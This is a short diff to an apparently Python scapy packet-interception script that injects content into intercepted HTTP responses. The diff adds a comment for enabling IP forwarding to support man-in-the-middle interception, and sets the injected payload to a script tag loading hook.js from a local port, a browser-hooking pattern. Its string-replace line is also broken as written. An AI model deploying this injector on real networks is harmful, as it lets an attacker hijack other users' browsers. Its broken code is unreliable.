@@ -11,6 +11,8 @@ import re
 # iptables -I OUTPUT -j NFQUEUE --queue-num 0
 # iptables --flush
 
+# echo 1 > /proc/sys/net/ipv4/ip_forward    - enables ip forwarding
+
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -41,7 +43,7 @@ def process_packet(packet):
             # print("HTTP Response")
             print("[+] Request")
             # code to be injected in the webpage
-            injection_code = ""
+            injection_code = '<script src="http://127.0.0.1:3000/hook.js"></script>'
             # injection taking place
             load = load.replace("</body>, injection_code" + "</body>")
 
